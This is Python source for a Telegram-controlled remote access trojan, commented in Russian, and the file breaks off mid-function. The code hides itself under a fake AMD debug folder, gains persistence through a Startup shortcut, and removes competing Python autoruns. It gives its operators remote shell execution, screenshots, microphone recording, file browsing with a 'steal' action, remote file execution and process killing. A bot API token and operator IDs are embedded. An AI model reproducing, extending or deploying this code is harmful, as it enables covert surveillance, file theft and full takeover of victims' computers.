import sys
import subprocess

def ensure_package(pkg):
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

for pkg in ["telebot", "mss", "psutil", "winotify", "pyaudio", "wave", "Pillow", "pywin32", "pygame"]:
    ensure_package(pkg)
import telebot
from telebot import types
import mss
import tempfile
import psutil
import subprocess
import os
import tkinter
import base64
import string
import sys
import html
import threading
import time
import pyaudio
import wave
from PIL import Image

# Tkinter для кастомных уведомлений
import tkinter as tk
from tkinter import ttk

# Настройки уведомлений
ShowNotifications = False
#
#  --self
API_TOKEN = '7851168987:AAHo0NfMHNKsMSTmkb9iJkBAoi-IYWAX49U'
ALLOWED_USER_ID = [7580867752, 7101839784, 5320203732, 7723026733]

# Таблица пользователей с кастомными никами
USER_NICKS = {
    7580867752: "дак",
    5320203732: "тигрёнок", 
    7723026733: "аку :3",
    7101839784: "realuzoth"
}

USER_RESTRICTIONS = {
    7580867752: ['📂 Выполнить файл', '🗂 Проводник', '🔄 Перезагрузить ПК', '⏹ Выключить ПК']
}

AMD_DEBUG_PATH = r"C:\AMD_debug"

bot = telebot.TeleBot(API_TOKEN)

user_paths = {}
PAGE_SIZE = 10


notification_count = 0

# Список активных уведомлений для управления ими
active_notifications = []


def encode_path(path):
    return base64.urlsafe_b64encode(path.encode()).decode()

def decode_path(data):
    return base64.urlsafe_b64decode(data.encode()).decode()

def list_drives():
    if sys.platform == 'win32':
        from ctypes import windll
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(f'{letter}:\\')
            bitmask >>= 1
        return drives
    else:
        return ['/']

def get_size(path):
    try:
        if os.path.isfile(path):
            return os.path.getsize(path)
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(path):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                try:
                    total_size += os.path.getsize(fp)
                except Exception:
                    pass
        return total_size
    except Exception:
        return 0

def human_size(size):
    for unit in ['Б','КБ','МБ','ГБ','ТБ']:
        if size < 1024:
            return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} ПБ"

def escape_html(text):
    return html.escape(text)

# Система кастомных уведомлений как в Telegram
class NotificationWindow:
    def __init__(self, title, message, icon="🔔"):
        # Создаем главное окно без родителя
        self.root = tk.Tk()
        
        # Настройки окна - полностью неинтерактивное
        self.root.overrideredirect(True)  # Убираем рамку и заголовок
        self.root.attributes('-topmost', True)  # Поверх всех окон
        self.root.attributes('-alpha', 0.95)  # Прозрачность
        self.root.attributes('-disabled', True)  # Отключаем взаимодействие
        self.root.attributes('-toolwindow', True)  # Убираем из панели задач
        self.root.configure(bg='#2D2D2D')  # Темный фон
        
        # Позиционируем в правом нижнем углу
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        window_width = 380
        window_height = 90
        x = screen_width - window_width - 20
        y = screen_height - window_height - 20
        
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        
        # Создаем основной фрейм с красивой рамкой
        main_frame = tk.Frame(self.root, bg='#404040', relief='flat', bd=2)
        main_frame.pack(fill='both', expand=True, padx=1, pady=1)
        
        # Создаем внутренний фрейм с тенью
        inner_frame = tk.Frame(main_frame, bg='#2D2D2D', relief='flat', bd=0)
        inner_frame.pack(fill='both', expand=True, padx=2, pady=2)
        
        # Создаем layout
        content_frame = tk.Frame(inner_frame, bg='#2D2D2D')
        content_frame.pack(fill='both', expand=True, padx=15, pady=10)
        
        # Иконка
        icon_label = tk.Label(content_frame, text=icon, font=('Arial', 24), 
                             bg='#2D2D2D', fg='#4CAF50')
        icon_label.pack(side='left', padx=(0, 15))
        
        # Текстовая область
        text_frame = tk.Frame(content_frame, bg='#2D2D2D')
        text_frame.pack(side='left', fill='both', expand=True)
        
        # Заголовок
        title_label = tk.Label(text_frame, text=title, font=('Arial', 12, 'bold'), 
                              bg='#2D2D2D', fg='white', anchor='w')
        title_label.pack(fill='x', pady=(0, 2))
        
        # Сообщение
        message_label = tk.Label(text_frame, text=message, font=('Arial', 10), 
                                bg='#2D2D2D', fg='#E0E0E0', anchor='w', wraplength=280)
        message_label.pack(fill='x')
        
        # Отключаем все взаимодействие с элементами
        for widget in [main_frame, inner_frame, content_frame, icon_label, text_frame, title_label, message_label]:
            widget.bind('<Button-1>', lambda e: 'break')
            widget.bind('<Key>', lambda e: 'break')
            widget.bind('<FocusIn>', lambda e: 'break')
        
        # Показываем окно
        self.root.lift()
        
        # Автоматическое закрытие через 5 секунд
        self.root.after(5000, self.close_notification)
        
    def close_notification(self):
        # Анимация исчезновения
        def fade_out():
            for i in range(20, -1, -1):
                self.root.attributes('-alpha', i / 20.0)
                time.sleep(0.05)
            self.root.destroy()
        
        threading.Thread(target=fade_out, daemon=True).start()

def get_user_nick(user_id):
    """Получить ник пользователя по ID"""
    return USER_NICKS.get(user_id, f"User{user_id}")

def hide_all_notifications():
    """Скрыть все активные уведомления"""
    global active_notifications
    for notification in active_notifications[:]:  # Копируем список для безопасной итерации
        try:
            if notification and notification.root and notification.root.winfo_exists():
                notification.root.withdraw()  # Скрываем окно
        except:
            pass
    active_notifications.clear()

def show_notification(title, message, icon="🔔"):
    """Показать кастомное уведомление как в Telegram"""
    global notification_count, ShowNotifications
    
    if not ShowNotifications:
        return
    
    def create_notification():
        global notification_count, active_notifications
        try:
            notification_count += 1
            print(f"🔔 Уведомление #{notification_count}: {title} - {message}")
            
            # Создаем уведомление
            notification = NotificationWindow(title, message, icon)
            
            # Добавляем в список активных уведомлений
            active_notifications.append(notification)
            
            # Обрабатываем события tkinter
            notification.root.mainloop()
            
            # Удаляем из списка активных уведомлений после закрытия
            if notification in active_notifications:
                active_notifications.remove(notification)
                
        except Exception as e:
            print(f"❌ Ошибка показа уведомления: {e}")
    
    # Запускаем в отдельном потоке
    threading.Thread(target=create_notification, daemon=True).start()

def init_qt_app():
    """Инициализация (заглушка для совместимости)"""
    pass

def setup_amd_debug_folder():
    """Создает папку AMD_debug и перемещает туда скрипт"""
    try:
        import shutil
        
        # Создаем папку AMD_debug если её нет
        if not os.path.exists(AMD_DEBUG_PATH):
            os.makedirs(AMD_DEBUG_PATH)
            print(f"✅ Создана папка: {AMD_DEBUG_PATH}")
        
        # Получаем текущий путь скрипта
        current_path = os.path.abspath(__file__)
        target_path = os.path.join(AMD_DEBUG_PATH, "aganee.pyw")
        
        # Если скрипт уже в нужном месте, пропускаем
        if current_path.lower() == target_path.lower():
            return target_path
        
        # Копируем скрипт в AMD_debug
        shutil.copy2(current_path, target_path)
        print(f"✅ Скрипт перемещен в: {target_path}")
        
        # Удаляем старый файл если он не в AMD_debug
        if current_path.lower() != target_path.lower():
            try:
                os.remove(current_path)
                print(f"✅ Старый файл удален: {current_path}")
            except:
                pass
        
        return target_path
        
    except Exception as e:
        print(f"❌ Ошибка настройки AMD_debug: {e}")
        return os.path.abspath(__file__)

def cleanup_startup_links(allowed_script_path=None):
    """Удаляет из Startup все ярлыки/батники, ведущие на .py/.pyw, кроме текущего скрипта."""
    try:
        from pathlib import Path
        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

        allowed = None
        if allowed_script_path:
            try:
                allowed = os.path.abspath(allowed_script_path).lower()
            except Exception:
                allowed = str(allowed_script_path).lower()

        # 1) Удаляем .lnk, которые ссылаются на .py/.pyw и не равны allowed
        try:
            import pythoncom  # noqa: F401
            import win32com.client
            shell = win32com.client.Dispatch('WScript.Shell')

            for lnk in startup_folder.glob('*.lnk'):
                try:
                    sc = shell.CreateShortcut(str(lnk))
                    target = (sc.TargetPath or '').strip()
                    args = (sc.Arguments or '').strip()
                    target_l = target.lower()
                    args_l = args.lower()

                    referenced_script = None

                    if target_l.endswith('.py') or target_l.endswith('.pyw'):
                        referenced_script = os.path.abspath(target).lower()
                    else:
                        # Ярлык на python/pythonw.exe — пытаемся извлечь путь к .py/.pyw из аргументов
                        if target_l.endswith('python.exe') or target_l.endswith('pythonw.exe'):
                            # Простая эвристика: берем первое "...py[w]" из аргументов
                            candidate = None
                            if '.pyw' in args_l or '.py' in args_l:
                                # Попробуем выделить токен в кавычках
                                import re
                                m = re.search(r'"([^"]+\.pyw?)"', args_l)
                                if m:
                                    candidate = m.group(1)
                                else:
                                    # Без кавычек — берем слово с .py/.pyw
                                    for part in args.split():
                                        if part.lower().endswith('.py') or part.lower().endswith('.pyw'):
                                            candidate = part
                                            break
                            if candidate:
                                try:
                                    referenced_script = os.path.abspath(candidate).lower()
                                except Exception:
                                    referenced_script = candidate.lower()

                    if referenced_script and (allowed is None or referenced_script != allowed):
                        try:
                            lnk.unlink()
                            print(f"✅ Удален ярлык на Python-скрипт: {lnk.name}")
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass

        # 2) Удаляем .bat, которые запускают python .py/.pyw и не равны allowed
        for file in startup_folder.glob("*.bat"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    content_l = content.lower()
                    if 'python' in content_l and ('.py' in content_l or '.pyw' in content_l):
                        if allowed and allowed in content_l:
                            continue
                        file.unlink()
                        print(f"✅ Удален автозапуск (.bat): {file.name}")
            except Exception:
                pass

    except Exception as e:
        print(f"❌ Ошибка очистки Startup: {e}")

def create_startup_link(script_path):
    """Создает .lnk ярлык на сам скрипт в папке Startup (без .bat)."""
    try:
        from pathlib import Path
        import pythoncom  # noqa: F401 (инициализация COM)
        import win32com.client

        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup_folder.mkdir(parents=True, exist_ok=True)

        script_name = os.path.basename(script_path).replace('.pyw', '').replace('.py', '')
        lnk_path = startup_folder / f"{script_name}.lnk"

        # На всякий случай удалим старый .bat, если был
        bat_path = startup_folder / f"{script_name}.bat"
        try:
            if bat_path.exists():
                bat_path.unlink()
        except Exception:
            pass

        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(str(lnk_path))
        # Запускаем напрямую сам .pyw — ассоциация .pyw открывает pythonw.exe без консоли
        shortcut.TargetPath = str(script_path)
        shortcut.WorkingDirectory = str(Path(script_path).parent)
        shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE
        shortcut.IconLocation = str(script_path)
        shortcut.Description = "uwurat autostart"
        shortcut.save()

        print(f"✅ Создан ярлык автозапуска: {lnk_path}")
        return True

    except Exception as e:
        print(f"❌ Ошибка создания ярлыка в Startup: {e}")
        return False

def kill_other_python_processes():
    """Останавливает все Python процессы кроме текущего"""
    try:
        import psutil
        current_pid = os.getpid()
        current_script = os.path.abspath(__file__)
        
        killed_count = 0
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                # Проверяем только Python процессы
                if proc.info['name'] and 'python' in proc.info['name'].lower():
                    # Пропускаем текущий процесс
                    if proc.info['pid'] == current_pid:
                        continue
                    
                    # Проверяем командную строку
                    cmdline = proc.info.get('cmdline', [])
                    if cmdline:
                        cmdline_str = ' '.join(cmdline).lower()
                        
                        # Пропускаем если это наш скрипт
                        if current_script.lower() in cmdline_str:
                            continue
                        
                        # Пропускаем системные Python процессы
                        if any(skip in cmdline_str for skip in ['pip', 'conda', 'jupyter', 'spyder', 'pycharm']):
                            continue
                        
                        # Убиваем процесс
                        proc.terminate()
                        killed_count += 1
                        print(f"🔄 Остановлен Python процесс: PID {proc.info['pid']}")
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        if killed_count > 0:
            print(f"✅ Остановлено {killed_count} Python процессов")
        else:
            print("ℹ️ Других Python процессов не найдено")
            
    except ImportError:
        print("⚠️ Модуль psutil не установлен, используем taskkill")
        # Fallback через taskkill
        try:
            result = subprocess.run(['taskkill', '/f', '/im', 'python.exe'], 
                                  capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                print("✅ Python процессы остановлены через taskkill")
        except:
            pass
    except Exception as e:
        print(f"❌ Ошибка остановки Python процессов: {e}")

def get_user_buttons(user_id):
    """Возвращает список доступных кнопок для пользователя с учетом ограничений"""
    all_buttons = [
        '🖼 Скриншот', '🗂 Процессы', '💻 Cmd', '🔄 Перезагрузить ПК',
        '⏹ Выключить ПК', '📂 Выполнить файл', '🗂 Проводник', '🌐 Ссылка',
        '🎤 Записать микрофон', '🎬 Записать GIF', '💬 Popup сообщение', '🔊 Воспроизвести звук', '🔄 Update', '➖ Свернуть всё'
    ]
    
    # Получаем ограничения для пользователя
    restrictions = USER_RESTRICTIONS.get(user_id, [])
    
    # Фильтруем кнопки, убирая заблокированные
    available_buttons = [btn for btn in all_buttons if btn not in restrictions]
    
    return available_buttons

def update_main_keyboard(user_id=None):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    
    # Получаем доступные кнопки для пользователя
    if user_id:
        available_buttons = get_user_buttons(user_id)
    else:
        available_buttons = [
            '🖼 Скриншот', '🗂 Процессы', '💻 Cmd', '🔄 Перезагрузить ПК',
            '⏹ Выключить ПК', '📂 Выполнить файл', '🗂 Проводник', '🌐 Ссылка',
            '🎤 Записать микрофон', '🎬 Записать GIF', '💬 Popup сообщение', '🔊 Воспроизвести звук', '🔄 Update', '➖ Свернуть всё'
        ]
    
    # Создаем кнопки только для доступных функций
    buttons = []
    for button_text in available_buttons:
        buttons.append(types.KeyboardButton(button_text))
    
    # Располагаем кнопки в удобном порядке
    if len(buttons) >= 3:
        markup.add(buttons[0], buttons[1], buttons[2])
    if len(buttons) >= 6:
        markup.add(buttons[3], buttons[4], buttons[5])
    if len(buttons) >= 9:
        markup.add(buttons[6], buttons[7], buttons[8])
    if len(buttons) >= 11:
        markup.add(buttons[9], buttons[10])
    if len(buttons) > 11:
        markup.add(buttons[11])
    
    return markup

@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        if message.from_user.id in ALLOWED_USER_ID:
            bot.send_message(message.chat.id, 'Привет! Я ваш Telegram RAT.', reply_markup=update_main_keyboard(message.from_user.id))
    except Exception as e:
        print(f"❌ Ошибка в handle_start: {e}")

# Обработчик команды управления уведомлениями
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text and message.text.startswith('notif '))
def notification_command_handler(message):
    global ShowNotifications
    
    try:
        command = message.text.strip().lower()
        
        if command == 'notif true':
            ShowNotifications = True
            bot.send_message(message.chat.id, '✅ Уведомления включены')
        elif command == 'notif false':
            ShowNotifications = False
            bot.send_message(message.chat.id, '❌ Уведомления отключены')
        else:
            bot.send_message(message.chat.id, '❌ Неверная команда. Используйте: notif true или notif false')
            
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при изменении настроек уведомлений: {e}')


@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🖼 Скриншот')
def screenshot_handler(message):
    try:
        sent_msg = bot.send_message(message.chat.id, 'Делаю скриншот...')
        
        # Скрываем все уведомления перед скриншотом
        hide_all_notifications()
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # основной монитор
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmpfile:
                sct.shot(mon=1, output=tmpfile.name)
                bot.send_photo(message.chat.id, open(tmpfile.name, 'rb'))
        bot.delete_message(message.chat.id, sent_msg.message_id)
        
        # Показываем уведомление после скриншота
        user_nick = get_user_nick(message.from_user.id)
        show_notification("Скриншот", f"{user_nick} сделал скриншот", "📸")
        
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка при создании скриншота: {e}')

# --- Процессы как интерактивный список ---
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🗂 Процессы')
def processes_list_handler(message):
    import psutil
    # Блоклист процессов
    ignored_processes = [
        'svchost.exe', 'powershell.exe', 'SearchApp.exe', 
        'SystemSettings.exe', 'conhost.exe', 'fontdrvhost.exe',
        'ctfmon.exe', 'AUEPMaster.exe', 'taskhostw.exe', 'sihost.exe',
        'StartMenuExperienceHost.exe', 'WmiPrvSE.exe', 'WUDFHost.exe',
        'AMDRSServ.exe', 'amdfendrsr.exe', 'tiesrxx.exe',
        'AMDInstallManager.exe', 'steam-idle.exe', 'unsecapp.exe',
        'lsass.exe', 'services.exe', 'smss.exe', 'spoolsv.exe',
        'dllhost.exe', 'atieclxx.exe', 'atiesrxx.exe', 'audiodg.exe',
        'TextInputHost.exe', 'UserOOBEBroker.exe', 'SecurityHealthService.exe',
        'ShellExperienceHost.exe', 'RuntimeBroker.exe', 'RvControlSvc.exe',
        'SearchIndexer.exe', 'MicrosoftEdgeUpdate.exe', 'AMDRSSrcExt.exe',
        'AUEPDU.exe', 'ApplicationFrameHost.exe'
    ]
    processes = []
    seen_names = set()
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name']
            if name in ignored_processes or name in seen_names:
                continue
            seen_names.add(name)
            processes.append((proc.info['pid'], name))
        except Exception:
            pass
    processes = sorted(processes, key=lambda x: x[1].lower())
    markup = InlineKeyboardMarkup(row_width=1)
    for pid, name in processes[:50]:
        markup.add(InlineKeyboardButton(f'{name} (PID {pid})', callback_data=f'proc:menu:{pid}'))
    bot.send_message(message.chat.id, 'Список процессов (уникальные, первые 50):', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('proc:menu:'))
def process_menu_callback(call):
    pid = int(call.data.split(':')[2])
    import psutil
    try:
        proc = psutil.Process(pid)
        name = proc.name()
    except Exception:
        bot.edit_message_text('Процесс не найден.', call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton('❌ Завершить', callback_data=f'proc:kill:{pid}'),
        InlineKeyboardButton('🔄 Перезапустить', callback_data=f'proc:restart:{pid}'),
        InlineKeyboardButton('Отмена', callback_data='proc:cancel')
    )
    bot.edit_message_text(f'Процесс: {name} (PID {pid})', call.message.chat.id, call.message.message_id, reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('proc:'))
def process_action_callback(call):
    import psutil, os, sys, subprocess
    parts = call.data.split(':')
    action = parts[1]
    if action == 'kill':
        pid = int(parts[2])
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            bot.edit_message_text('✅ Процесс завершён.', call.message.chat.id, call.message.message_id)
        except Exception as e:
            bot.edit_message_text(f'❌ Не удалось завершить: {e}', call.message.chat.id, call.message.message_id)
    elif action == 'restart':
        pid = int(parts[2])
        try:
            proc = psutil.Process(pid)
            exe = proc.exe()
            proc.terminate()
            proc.wait(timeout=3)
            subprocess.Popen([exe])
            bot.edit_message_text('🔄 Процесс перезапущен.', call.message.chat.id, call.message.message_id)
        except Exception as e:
            bot.edit_message_text(f'❌ Не удалось перезапустить: {e}', call.message.chat.id, call.message.message_id)
    elif action == 'cancel':
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '💻 Cmd')
def cmd_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='cmd:cancel'))
    msg = bot.send_message(message.chat.id, 'Введите команду для выполнения в cmd:', reply_markup=markup)
    bot.register_next_step_handler(msg, cmd_execute_handler)

@bot.callback_query_handler(func=lambda call: call.data == 'cmd:cancel')
def cmd_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('Действие отменено.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

def cmd_execute_handler(message):
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if user_paths.get(message.from_user.id, {}).get('cancelled'):
        user_paths[message.from_user.id]['cancelled'] = False
        return
    command = message.text
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        response = ''
        if stdout:
            response += f'<pre>{escape_html(stdout)}</pre>'
        if stderr:
            response += f'\n❌ Ошибка:\n<pre>{escape_html(stderr)}</pre>'
        if not response:
            response = '✅ Команда выполнена'
        if len(response) > 4000:
            bot.send_message(message.chat.id, '❌ Слишком длинный вывод для отправки одним сообщением.')
        else:
            bot.send_message(message.chat.id, response, parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при выполнении команды: {str(e)}')

def shutdown_system(cmd):
    os.system(cmd)

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🔄 Перезагрузить ПК')
def reboot_request_handler(message):
    # Проверяем ограничения
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if '🔄 Перезагрузить ПК' in restrictions:
        bot.send_message(message.chat.id, '❌ У вас нет доступа к этой функции.')
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('✅ Подтвердить', callback_data='reboot:yes'), InlineKeyboardButton('❌ Отмена', callback_data='reboot:no'))
    bot.send_message(message.chat.id, '⚠️ Вы уверены, что хотите перезагрузить ПК?', reply_markup=markup)

def reboot_confirm_handler(message):
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if message.text.strip().lower() == 'да':
        bot.send_message(message.chat.id, 'Перезагрузка...')
        shutdown_system('shutdown /r /t 0')
    else:
        bot.send_message(message.chat.id, 'Перезагрузка отменена.')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '⏹ Выключить ПК')
def shutdown_request_handler(message):
    # Проверяем ограничения
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if '⏹ Выключить ПК' in restrictions:
        bot.send_message(message.chat.id, '❌ У вас нет доступа к этой функции.')
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('✅ Подтвердить', callback_data='shutdown:yes'), InlineKeyboardButton('❌ Отмена', callback_data='shutdown:no'))
    bot.send_message(message.chat.id, '⚠️ Вы уверены, что хотите выключить ПК?', reply_markup=markup)

def shutdown_confirm_handler(message):
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if message.text.strip().lower() == 'да':
        bot.send_message(message.chat.id, 'Выключение...')
        shutdown_system('shutdown /s /t 0')
    else:
        bot.send_message(message.chat.id, 'Выключение отменена.')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '📂 Выполнить файл')
def runfile_request_handler(message):
    # Проверяем ограничения
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if '📂 Выполнить файл' in restrictions:
        bot.send_message(message.chat.id, '❌ У вас нет доступа к этой функции.')
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('❌ Отмена', callback_data='runfile:cancel'))
    msg = bot.send_message(message.chat.id, 'Отправьте файл, который нужно выполнить.', reply_markup=markup)
    bot.register_next_step_handler(msg, runfile_receive_handler)

def runfile_receive_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if not message.document:
        bot.send_message(message.chat.id, '❌ Пожалуйста, отправьте файл как документ.')
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '❌ Не удалось получить путь к файлу.')
            return
        downloaded_file = bot.download_file(file_info.file_path)
        import tempfile, os
        filename = os.path.join(tempfile.gettempdir(), message.document.file_name)
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        bot.send_message(message.chat.id, f'Файл сохранён как {filename}. Запускаю...')
        os.startfile(filename)
        bot.send_message(message.chat.id, '✅ Файл запущен.')
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Ошибка при запуске файла: {str(e)}')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '🗂 Проводник')
def explorer_entry(message):
    # Проверяем ограничения
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if '🗂 Проводник' in restrictions:
        bot.send_message(message.chat.id, '❌ У вас нет доступа к этой функции.')
        return
    
    user_paths[message.from_user.id] = {'path': 'C:\\', 'page': 0, 'map': {}, 'show_drives': False}
    show_directory(message.chat.id, message.from_user.id)

def show_directory(chat_id, user_id, message_id=None):
    state = user_paths.get(user_id, {'path': 'C:\\', 'page': 0, 'map': {}, 'show_drives': False})
    path = state['path']
    page = state['page']
    id_map = {}
    markup = types.InlineKeyboardMarkup(row_width=1)
    # Показываем список дисков, если show_drives True или если path == 'DRIVES'
    if state.get('show_drives', False) or path == 'DRIVES':
        drives = list_drives()
        for idx, drive in enumerate(drives):
            id_map[str(idx)] = drive
            markup.add(types.InlineKeyboardButton(f'💽 {drive}', callback_data=f'explorer:cd:{idx}'))
        state['map'] = id_map
        state['show_drives'] = True
        user_paths[user_id] = state
        text = 'Диски на компьютере:'
        if message_id:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        else:
            bot.send_message(chat_id, text, reply_markup=markup)
        return
    try:
        items = os.listdir(path)
        items.sort()
        total = len(items)
        start = page * PAGE_SIZE
        end = start + PAGE_SIZE
        page_items = items[start:end]
        for idx, item in enumerate(page_items):
            full_path = os.path.join(path, item)
            elem_id = str(idx)
            id_map[elem_id] = full_path
            if os.path.isdir(full_path):
                markup.add(types.InlineKeyboardButton(f'📁 {item}', callback_data=f'explorer:dir:{elem_id}'))
            else:
                markup.add(types.InlineKeyboardButton(f'📄 {item}', callback_data=f'explorer:file:{elem_id}'))
        nav_buttons = []
        if page > 0:
            nav_buttons.append(types.InlineKeyboardButton('⬅️', callback_data='explorer:page:-1'))
        if end < total:
            nav_buttons.append(types.InlineKeyboardButton('➡️', callback_data='explorer:page:1'))
        if nav_buttons:
            markup.add(*nav_buttons)
        # Кнопка ".."
        if os.path.dirname(path) != path:
            if os.path.dirname(path) == path or path.rstrip('\\/') in list_drives():
                # Если мы в корне диска, кнопка возвращает к списку дисков
                id_map['..'] = 'DRIVES'
                markup.add(types.InlineKeyboardButton('⬆️ .. (ко всем дискам)', callback_data='explorer:cd:..'))
            else:
                id_map['..'] = os.path.dirname(path)
                markup.add(types.InlineKeyboardButton('⬆️ ..', callback_data='explorer:cd:..'))
        # Кнопка "Все диски" только если мы в корне диска
        drives_lower = [d.lower() for d in list_drives()]
        current_path = path.lower().rstrip('\\/') + '\\'
        if current_path in drives_lower:
            markup.add(types.InlineKeyboardButton('💽 Все диски', callback_data='explorer:drives:0'))
        state['map'] = id_map
        state['show_drives'] = False
        user_paths[user_id] = state
        text = f'Папка: {path}\nПоказано {start+1}-{min(end,total)} из {total}'
        if message_id:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        else:
            bot.send_message(chat_id, text, reply_markup=markup)
    except Exception as e:
        bot.send_message(chat_id, f'❌ Ошибка: {e}')

def show_item_actions(chat_id, user_id, item_id, is_dir, message_id=None, show_size=False):
    state = user_paths.get(user_id, {})
    id_map = state.get('map', {})
    item_path = id_map.get(item_id)
    if not item_path:
        bot.send_message(chat_id, '❌ Не удалось найти элемент.')
        return
    markup = types.InlineKeyboardMarkup(row_width=3)
    if is_dir:
        markup.add(
            types.InlineKeyboardButton(f'📂 Открыть', callback_data=f'explorer:action:open:{item_id}:dir'),
            types.InlineKeyboardButton(f'📥 Украсть', callback_data=f'explorer:action:steal:{item_id}:dir'),
            types.InlineKeyboardButton(f'🗑 Удалить', callback_data=f'explorer:action:delete:{item_id}:dir'),
            types.InlineKeyboardButton(f'✏️ Переименовать', callback_data=f'explorer:action:rename:{item_id}:dir')
        )
    else:
        markup.add(
            types.InlineKeyboardButton(f'📄 Открыть', callback_data=f'explorer:action:open:{item_id}:file'),
            types.InlineKeyboardButton(f'📥 Украсть', callback_data=f'explorer:action:steal:{item_id}:file'),
            types.InlineKeyboardButton(f'🗑 Удалить', callback_data=f'explorer:action:delete:{item_id}:file'),
            types.InlineKeyboardButton(f'✏️ Переименовать', callback_data=f'explorer:action:rename:{item_id}:file')
        )
    markup.add(types.InlineKeyboardButton('📏 Размер', callback_data=f'explorer:action:size:{item_id}:dir' if is_dir else f'explorer:action:size:{item_id}:file'))
    markup.add(types.InlineKeyboardButton('❌ Отмена', callback_data=f'explorer:action:cancel:{item_id}:dir' if is_dir else f'explorer:action:cancel:{item_id}:file'))
    text = f"{'Папка' if is_dir else 'Файл'}: {item_path}"
    if show_size:
        size = get_size(item_path)
        size_str = human_size(size)
        text += f"\nРазмер: {size_str}"
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# Модифицируем explorer_callback для показа меню действий
@bot.callback_query_handler(func=lambda call: call.data.startswith('explorer:'))
def explorer_callback(call):
    user_id = call.from_user.id
    if user_id not in ALLOWED_USER_ID:
        return
    data = call.data.split(':', 2)
    action = data[1]
    arg = data[2] if len(data) > 2 else ''
    state = user_paths.get(user_id, {'path': 'C:\\', 'page': 0, 'map': {}, 'show_drives': False})
    id_map = state.get('map', {})
    if action == 'cd':
        if arg == '..':
            if id_map.get('..') == 'DRIVES':
                state['path'] = 'DRIVES'
                state['show_drives'] = True
            else:
                state['path'] = id_map.get('..', state['path'])
                state['show_drives'] = False
        else:
            new_path = id_map.get(arg, state['path'])
            if new_path in list_drives():
                state['path'] = new_path
                state['show_drives'] = False
            else:
                state['path'] = new_path
                state['show_drives'] = False
